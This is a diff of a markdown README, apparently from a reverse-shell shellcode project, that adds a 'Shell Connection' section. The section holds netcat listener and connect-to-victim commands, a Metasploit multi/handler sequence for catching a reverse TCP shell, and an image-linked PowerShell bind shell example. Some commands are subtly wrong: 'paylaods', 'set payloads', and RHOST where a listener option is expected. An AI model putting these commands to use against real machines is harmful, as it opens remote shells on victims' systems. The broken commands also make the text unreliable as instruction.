@@ -52,19 +52,33 @@ $ld -m i386 reverse_shell.o -o reverse_shell32.exe
 $nasm -f bin reverse_shell.s -o reverse_shell_bin.o
 $cat reverse_shell_bin | hexdump -C
 ```
-## :two: Exploit
+## :two: Shell Connection 
 
-### Reverse Tcp
+### Reverse Tcp netcat
 
 ```
 $netcat -v -l -p 4444
 ```
 
-### Reverse Bind Tcp
+### Reverse Tcp msf
+
+```
+$ msfconsole
+$ use exploit/multi/handler
+$ show paylaods
+$ set payloads generic/reverse_tcp
+$ set RHOST [ip]
+$ set LPORT [PORT]
+$ exploit
+```
+
+### Reverse Bind Tcp netcat
 
 ```
 $netcat -v victim_ip 4444
 ```
+## :three: Example
+
 ### Win >= 7 Bind reverse shell \[ powershell.exe \]
 
 <img src="https://zupimages.net/up/19/01/wq32.png">
